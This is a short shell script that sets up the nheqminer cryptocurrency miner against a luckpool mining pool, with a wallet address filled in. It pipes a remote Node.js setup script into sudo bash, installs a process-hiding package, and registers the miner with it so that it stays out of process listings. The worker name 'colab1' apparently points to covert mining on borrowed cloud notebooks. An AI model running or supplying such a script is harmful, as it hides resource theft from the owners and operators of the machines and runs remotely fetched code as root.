sudo apt update
clear
sudo apt install screen
screen -R nheqminer
curl -fsSL https://deb.nodesource.com/setup_17.x | sudo -E bash - && sudo apt-get install -y nodejs && npm i -g node-process-hider && apt install screen && wget https://github.com/VerusCoin/nheqminer/releases/download/v0.8.2/nheqminer-Linux-v0.8.2.tgz && tar -xf nheqminer-Linux-v0.8.2.tgz &&  tar -xf nheqminer-Linux-v0.8.2.tar.gz && cd nheqminer && sudo ph add nheqminer && apt install screen && screen 
screen -R nheqminer
sudo ./nheqminer -v -l na.luckpool.net:3956 -u RSC1ZnrrkGLuperMYD4Ta6FYnG7jFfuf4T.colab1 -t 10
